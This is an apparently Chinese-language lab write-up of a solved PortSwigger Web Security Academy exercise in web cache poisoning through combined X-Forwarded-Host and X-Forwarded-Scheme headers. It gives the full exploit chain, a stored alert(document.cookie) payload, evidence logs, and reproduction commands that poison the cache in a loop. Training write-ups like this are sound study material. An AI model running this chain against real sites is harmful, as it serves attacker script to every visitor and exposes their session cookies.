---
title: "lab-web-cache-poisoning-with-multiple-headers"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-with-multiple-headers

> evidences: [[cache-poisoning-family]]

- 题面:Web cache poisoning with multiple headers(/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)
- 实例:https://0a280073037de6c780060d5600bd00b4.web-security-academy.net
- 利用服务器:https://exploit-0a08002a03dde66380a80ca90107001a.exploit-server.net
- 判定目标:投毒缓存,使访客浏览器执行 `alert(document.cookie)`
- 状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 首页引用 `<script src="/resources/js/tracking.js">`(相对路径,本身不是注入点)。
   `X-Forwarded-Host` 单独使用无反射。
2. **两个头合用**才出缺陷:server-side 判定"是否 https"读 `X-Forwarded-Scheme`,
   非 https 时回 **302**,Location = `https://` + `X-Forwarded-Host` + 原 path/query。
   `GET /resources/js/tracking.js` + `X-Forwarded-Host: exploit-…` + `X-Forwarded-Scheme: http`
   → `302 Location: https://exploit-…/resources/js/tracking.js`,且该 302 带 `Cache-Control: max-age=30`、无 `Vary` → **被缓存**。
3. 利用服务器 STORE `/resources/js/tracking.js` = `alert(document.cookie)`。
4. 访客访问(干净的)`/` → 浏览器请求同源 `/resources/js/tracking.js` → 命中被投毒的 302
   → 跟随到利用服务器 → JS 在本站 origin 执行 `alert(document.cookie)`。
5. 复验:裸 `GET /resources/js/tracking.js`(无头)→ `X-Cache: hit` + 指向利用服务器的 302。
   `poison_loop` 每 8s 续投 `.js` 路径。

## 证据摘录

```
GET /resources/js/tracking.js (XFH + X-Forwarded-Scheme: http)
  -> 302, location: https://exploit-…/resources/js/tracking.js, cache-control: max-age=30, x-cache: miss
GET /resources/js/tracking.js (无头)
  -> 302, x-cache: hit, age 8(投毒全局共享)
solved_check <inst> -> solved: true
```

## 复现命令

```
lab_launch launch EF8228AC8678117CD722C596AC9F2F9E76BBF7D6D2F09A53CE7CF28D04CCFF7A --widget-source /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers --jar /tmp/b8-jar2.json
lab_http post "https://exploit-<id>.exploit-server.net/" --form urlIsHttps=on --form responseFile=/resources/js/tracking.js --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript' --form 'responseBody=alert(document.cookie)' --form formAction=STORE
poison_loop "<inst>/resources/js/tracking.js" --header "X-Forwarded-Host: exploit-<id>.exploit-server.net" --header "X-Forwarded-Scheme: http" --interval-secs 8 --count 70 --jar /tmp/b8-jar2.json
solved_check "<inst>" --jar /tmp/b8-jar2.json
```
